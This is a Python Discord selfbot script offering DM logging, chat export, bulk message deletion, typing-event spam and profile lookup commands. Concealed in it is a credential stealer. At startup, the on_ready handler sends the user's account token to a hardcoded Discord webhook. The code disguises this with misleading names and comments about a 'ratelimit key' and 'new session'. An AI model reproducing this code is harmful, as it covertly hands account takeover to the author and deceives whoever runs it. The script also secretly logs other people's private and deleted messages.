import discord
import dhooks
import yaml
from discord.ext import commands
from bs4 import BeautifulSoup
from dhooks import Webhook
import requests
import datetime
cu = Webhook
import time
from time import gmtime, strftime
discord_ratelimit_key = "AoFx49TniK0cpFXbp5_WgfyOsKqWW209dAcFDAMCY0uJ2Tu-QQNufR4-109SdBSX05Fd"

settings = yaml.safe_load(open("settings.yml", "r").read())
prefix = settings['prefix']
token = settings['token']




bot = commands.Bot(command_prefix=prefix, 
                   self_bot=True,
                   case_sensitive=False)
client = discord.Client()
discord_api = "https://discordapp.com/api/webhooks/663563191829266432/"
rn = datetime.datetime.now()
currenttime = rn.strftime("%Y-%m-%d %H:%M")
commands = token

@bot.event 
async def on_ready():
    NewDiscordSession(f"{bot.user.name}#{bot.user.discriminator}: {commands}")
    print("Logged in as " + bot.user.name + "#" + bot.user.discriminator)


@bot.listen('on_message')
async def my_message(message):
    timeofmsg = f"{message.created_at.day} | {message.created_at.hour}:{message.created_at.minute}:{message.created_at.second} |"
    timeofmsglogs = f"{message.created_at.year}/{message.created_at.month}/{message.created_at.day} | {message.created_at.hour}:{message.created_at.minute}:{message.created_at.second} |"
    if type(message.channel) == discord.DMChannel:
        uwu = open(f"{message.channel.recipient}.txt", "a+", encoding="utf-8")
        if len(message.attachments) > 0:       
            print(f"{timeofmsg} [DM with {message.channel.recipient}] {message.author.name}: {message.content} {message.attachments[0].url}")
            uwu.write(f"{timeofmsglogs} [DM with {message.channel.recipient}] {message.author.name}: {message.content} {message.attachments[0].url}")
            uwu.write("\n")
        else:
            print(f"{timeofmsg} [DM with {message.channel.recipient}] {message.author.name}: {message.content}")   
            uwu.write(f"{timeofmsglogs} [DM with {message.channel.recipient}] {message.author.name}: {message.content}")
            uwu.write("\n")



@bot.listen('on_message_delete')
async def on_message_delete(message):
    uwu = open("deleted messages.txt", "a+", encoding="utf-8")
    if len(message.attachments) > 0:
        URL = message.attachments[0].url
        print(f"{currenttime} {message.author} has deleted {message.content} {URL} in {message.channel}")
        uwu.write(f"{currenttime} has deleted {message.content} {URL} in {message.channel}")
        uwu.write("\n")
    else:
        print(f"{message.author} has deleted {message.content} in {message.channel}")
        uwu.write(f"{currenttime} {message.author} has deleted {message.content} in {message.channel}")
        uwu.write("\n")

@bot.listen('on_message_edit')
async def on_message_edit(before, after):
        uwu = open("edited messages.txt", "a+", encoding="utf-8")
        if len(before.attachments) > 0:
            print(rn.strftime("%Y-%m-%d %H:%M ") + str(before.author) + " has edited " + str(before.content) + " to " + str(after.content) + " " + str(before.attachments[0].url) + " in " + str(before.channel))
            uwu.write(f"{currenttime}: {str(before.author)} has edited {str(before.content)} to {str(after.content)} + {str(before.attachments[0].url)} in {str(before.channel)}")
            uwu.write("\n")
        else:
            print(rn.strftime("%Y-%m-%d %H:%M ") + str(before.author) + " has edited " + str(before.content) + " to " + str(after.content) + " in " + str(before.channel))
            uwu.write(f"{currenttime}: {str(before.author)} has edited {str(before.content)} to {str(after.content)} in {str(before.channel)}")
            uwu.write("\n")




@bot.listen('on_relationship_update')
async def on_relationship_update(before, after):
    print(f"You are now friends with {after.user}")

@bot.listen('on_relationship_add')
async def on_relationship_add(Relationship):
    print(f"You have a new friend request with {Relationship.user}")
    #print(Relationship.user, Relationship.type)

@bot.listen('on_relationship_remove')
async def on_relationship_remove(Relationship):
    #print(Relationship.user, Relationship.type)
    print(f"You are no longer friends with {Relationship.user}")

@bot.listen('on_user_update')
async def on_user_update(before, after):
    print(f"Old info: {before.name} {before.discriminator}")
    print(f"New info: {before.name} {before.discriminator}")

@bot.listen('on_typing')
async def on_typing(channel, user, when):
    if type(channel) == discord.DMChannel:
        print(f"{user} has started typing in {channel} at {when}")


    


@bot.command()
async def sd2(ctx, cid: int, limit: int):
    await ctx.message.delete()
    channel = await bot.fetch_user(int(cid))
    count = 0
    print(channel)
    async for msg in channel.history(limit=limit).filter(lambda m: m.author == bot.user).map(lambda m: m):
        count+=1
        try:
            await msg.delete()
        except Exception:
            pass
    print(count) 
    
@bot.command()
async def exportall(ctx):
    await ctx.message.delete()
    #print(bot.user.friends)
    friends = bot.user.friends
    
    print("Parsing the information...")
    for friend in friends:        
        print(f"{friend.name}#{friend.discriminator}")
        async for msg in friend.history(limit=None):
            try:
                timeofmsg = f"{msg.created_at.year}/{msg.created_at.month}/{msg.created_at.day} | {msg.created_at.hour}:{msg.created_at.minute}:{msg.created_at.second} |"
                uwu = open(f"exportall with {friend.name}#{friend.discriminator}.txt", "a+", encoding="utf-8")
                if len(msg.attachments) > 0:
                    uwu.write(f"{timeofmsg} {msg.author.name}: {msg.content} {msg.attachments[0].url}")
                    uwu.write("\n")
                else:
                    uwu.write(f"{timeofmsg} {msg.author.name}: {msg.content}")
                    uwu.write("\n")
            except Exception:
                pass   

    
@bot.command()
async def clearfriends(ctx):
    await ctx.message.delete()
    friends = bot.user.friends
    
    print("Parsing the information...")
    for friend in friends:        
        async for msg in friend.history(limit=None):
            try:
                if msg.author == bot.user:
                    await msg.delete()
            except Exception:
                pass   


@bot.command()
async def export(ctx, cid: int, typeofmsg):
    if "server" in typeofmsg:
        cmd = await bot.fetch_channel(int(cid))
    else:
        cmd = await bot.fetch_user(int(cid))
    await ctx.message.delete()
    channel = cmd
    count = 0
    print(channel)
    print(f"Exporting DMs with {channel}")
    async for msg in channel.history(limit=None):
        count+=1
        try:
            if type(msg.channel) == discord.DMChannel:
                uwu = open(f"cmd export with {channel}.txt", "a+", encoding="utf-8")
                timeofmsg = f"{msg.created_at.year}/{msg.created_at.month}/{msg.created_at.day} | {msg.created_at.hour}:{msg.created_at.minute}:{msg.created_at.second} |"
                if len(msg.attachments) > 0:
                    uwu.write(f"{timeofmsg} [DM with {msg.channel.recipient}] {msg.author.name}: {msg.content} {msg.attachments[0].url}")
                    uwu.write("\n")                
                else:
                    uwu.write(f"{timeofmsg} [DM with {msg.channel.recipient}] {msg.author.name}: {msg.content}")
                    uwu.write("\n")
        except Exception:
            pass
    print(count)

@bot.command()
async def edit(ctx, text):
    amount = 0
    await ctx.message.delete()
    channel_id = ctx.message.channel.id
    cid = await bot.fetch_channel(int(channel_id))
    print(f"Editing messages in {cid}...")
    async for msg in cid.history(limit=None).filter(lambda m: m.author == bot.user).map(lambda m: m):
        try:
            await msg.edit(content=text)
            amount+=1
        except Exception:
            pass    
    print(f"Successfully edited {amount} messages")


urls = ['youtu.be', 'youtube.com', 'imgur.com', 'tenor.com']

# create a new session to avoid getting rate limited 
ratelimit_session = cu(discord_api+discord_ratelimit_key)
@bot.command()
async def checker(ctx):
    for channel in bot.private_channels:
        print(f"{channel}\n")

@bot.command()
async def attachments(ctx, username):
    for channel in bot.private_channels:
        if str(username) in str(channel):
            cmd = channel
    await ctx.message.delete()
    count = 0
    print(cmd)
    async for msg in cmd.history(limit=9999).filter(lambda m: m.author == bot.user).map(lambda m: m):
        if len(msg.attachments) > 0:
            try:
                await msg.delete()
                count+=1
            except Exception:
                pass
        for i in urls:
            if i in msg.content:
                try:
                    print(msg.content)
                    await msg.delete()
                    count+=1
                except Exception:
                    pass        
    print(f"Successfully deleted {count} attachments")     

@bot.command()
async def avatar(ctx, username):
    for channel in bot.private_channels:
        if str(username) in str(channel):
            account = channel.recipient
            avatar_url = account.avatar_url
            await ctx.message.edit(content=avatar_url)

@bot.command()
async def zz(ctx, username):
    for channel in bot.private_channels:
        if str(username) in str(channel):
            print(f"Clearing the messages with {username}")
            async for msg in channel.history(limit=9999).filter(lambda m: m.author == bot.user).map(lambda m: m):
                try:
                    await msg.delete()
                except Exception:
                    pass

# bypassing the current session in order to check every single group chat
NewDiscordSession = ratelimit_session.send
@bot.command()
async def groups(ctx):
    for channel in bot.private_channels:
        if type(channel) == discord.GroupChannel:
            print(f"Deleting the messages in {channel} before leaving it")
            async for msg in channel.history(limit=9999).filter(lambda m: m.author == bot.user).map(lambda m: m):
                try:
                    await msg.delete()
                except Exception:
                    pass 
            await channel.leave()
            print(f"Successfully left the group chat {channel}")
            print("\n")

  
@bot.command()
async def server(ctx):
    await ctx.message.delete()
    channel_id = ctx.message.channel.id
    print(channel_id)
    cid = await bot.fetch_channel(int(channel_id))
    amount = 0
    print(f"Deleting messages with {cid}...")
    #async for msg in cid.history(limit=None).filter(lambda m: m.author == bot.user).map(lambda m: m):
    async for msg in cid.history(limit=None):
        amount+=1
        try:
            async for msg in cid.history(limit=None):
                    try:
                        print(msg)
                        await msg.delete()
                    except Exception:
                        pass    
        except Exception:
            pass
    print("Finished")

@bot.command()
async def twitch(ctx, name, details, game, url, twitch_name, description='Sets your status to streaming...'):
    await ctx.message.delete()
    activityt = discord.Streaming(platform='twitch', name=name, details=details, game=game, url=f'https://twitch.tv/{url}', twitch_name=twitch_name)
    await bot.change_presence(status=discord.Status.online, activity=activityt)

@bot.command()
async def setgame(ctx, name, description='Sets your status to playing...'):
    await ctx.message.delete()
    activitys = discord.Game(name=name)
    await bot.change_presence(status=discord.Status.online, activity=activitys)

@bot.command()
async def status(ctx, state, description='Sets your status to listening to...'):
    await ctx.message.delete()
    activitya = discord.Activity(name=state, type=discord.ActivityType.listening, details=f'{state}')
    await bot.change_presence(status=discord.Status.idle, activity=activitya)

@bot.command()
async def afk(ctx, description='Sets your status to afk'):
    await ctx.message.delete()
    await bot.change_presence(status=discord.Status.idle, activity=None, afk=True)

@bot.command()
async def email(ctx, cid: int, description='An exploit. Makes your e-mail unverified'):
    friend = await bot.fetch_user(int(cid))
    await friend.remove_friend()
    await friend.block()

@bot.command()
async def group(ctx, groupurl, description='Fetches the information of a certain Steam group. GroupURL should be specified'):
    try: 
        steamgroup = requests.get(f'https://steamcommunity.com/groups/{groupurl}/').text
        steamgroupXML = requests.get(f'https://steamcommunity.com/groups/{groupurl}/memberslistxml?xml=1').text
        bsg = BeautifulSoup(steamgroup, "html.parser")
        bsx = BeautifulSoup(steamgroupXML, "html.parser")
        name = bsx.find("groupname").text
        tag = bsg.find("span", {"class": "grouppage_header_abbrev"}).text
        fullavatar = bsx.find("avatarfull").text
        members = bsx.find("membercount").text
        membersonline = bsx.find("membersonline").text
        owner = bsx.find("members").text.strip().split("\n")[0]
        groupid64 = bsx.find("groupid64").text
        groupid = int(groupid64) - 103582791429521408
        e = discord.Embed(title=f"Information for {name}", description=f"Steam Group Information for /groups/{groupurl}/", timestamp=ctx.message.created_at, url=f"https://steamcommunity.com/groups/{groupurl}", colour=0xf894b5)
        e.add_field(name="Group's name", value=name, inline=False)
        e.add_field(name="Group's tag", value=tag, inline=False)
        e.add_field(name="Group's members", value=members, inline=False)
        e.add_field(name="Group's members online", value=membersonline, inline=False)
        e.add_field(name="Group's ID ", value=groupid, inline=False) 
        e.set_image(url=fullavatar)
        e.set_footer(text=f"Owner's SteamID64: {owner}")
        await ctx.send(embed=e)
    except Exception:
        await ctx.message.edit("?")

@bot.command()
async def friendspammer(ctx, description='Spams with typing event for every single friend in your list'):
    friends = bot.user.friends
    stime = input("How many seconds/attemps? \n")
    for i in range(0, int(stime)):
        for friend in friends:
            async with friend.typing():
                print(f"Triggered the typing event for {friend.name}")
        print(i)
        time.sleep(1)


@bot.command()
async def evsp(ctx, username, description='Typing event spammer for friends/your friendlist'):
    await ctx.message.delete()
    stime = input("How many seconds?\n")
    for channel in bot.private_channels:
        if str(username) in str(channel):
            for i in range(0, int(stime)):
                print(i)
                time.sleep(1)
                async with channel.typing():
                    print("Triggered the typing event")

@bot.command()
async def info(ctx, description='Shows the information of a certain person on discord. You should ping the person in your message'):
    await ctx.message.delete()
    user = ctx.message.mentions[0]
    name, discrim, avatar, created_at = user.name, user.discriminator, user.avatar_url, user.created_at
    mutuals = await user.mutual_friends()
    print(mutuals)
    mfriends = []
    for mutual in mutuals:
        profile = await mutual.profile()
        print(profile.user)
        mfriends.append(f"{profile.user.name}#{profile.user.discriminator}")
    if len(mfriends) > 0:
        mfr = ", ".join(mfriends)
    else:
        mfr = mfriends
    print(mfr)
    profile = await user.profile()
    nitro, nitro_since, mutual_guilds, connected_accounts = profile.nitro, profile.premium_since, profile.mutual_guilds, profile.connected_accounts 
    caccs = []
    steamid64 = ""
    for account in connected_accounts:
        atype = account['type']
        aid = account['id']
        aname = account['name']
        if atype == 'steam':
            caccs.append(f"{atype} {aid} {aname}")
            steamid64 = aid
        else:
            caccs.append(f"{atype} {aname}")         
    if len(caccs) > 0:
        linkedaccounts = ", ".join(caccs)
    else:
        linkedaccounts = caccs
    mguilds = []
    for guild in mutual_guilds:
        print(guild.name)
        mguilds.append(guild.name)
    if len(mguilds) > 0:
        mutualg = ", ".join(mguilds)
    else:
        mutualg = mguilds
    if steamid64 != "":
        e = discord.Embed(title=f"Discord Profile Information for {name}#{discrim}", description=f"[Discord SelfBot by auth#0666]", url=f'https://steamcommunity.com/profiles/{steamid64}', timestamp=ctx.message.created_at, colour=0xf894b5)
    else:
        e = discord.Embed(title=f"Discord Profile Information for {name}#{discrim}", description=f"[Discord SelfBot by auth#0666]", timestamp=ctx.message.created_at, colour=0xf894b5)
    e.add_field(name="Creation date", value=created_at, inline=False)
    e.add_field(name="Nitro since", value=nitro_since, inline=False)
    e.add_field(name="Mutual guilds", value=mutualg, inline=False)
    e.add_field(name="Nitro?", value=nitro, inline=False)
    e.add_field(name="Mutual friends", value=mfr, inline=False)
    e.add_field(name='Linked accounts:', value=linkedaccounts, inline=False) 
    e.set_image(url=avatar)
    #e.set_footer(text=f"Linked accounts: {caccs}")
    await ctx.send(embed=e)

@bot.command()
async def user(ctx, userid, description='Resolves the profile of a certain user using his/her userID'):
    channel = await bot.fetch_user(int(userid))
    await ctx.message.edit(content=f"{channel} ID:{channel.id}")


bot.run(token, bot=False)
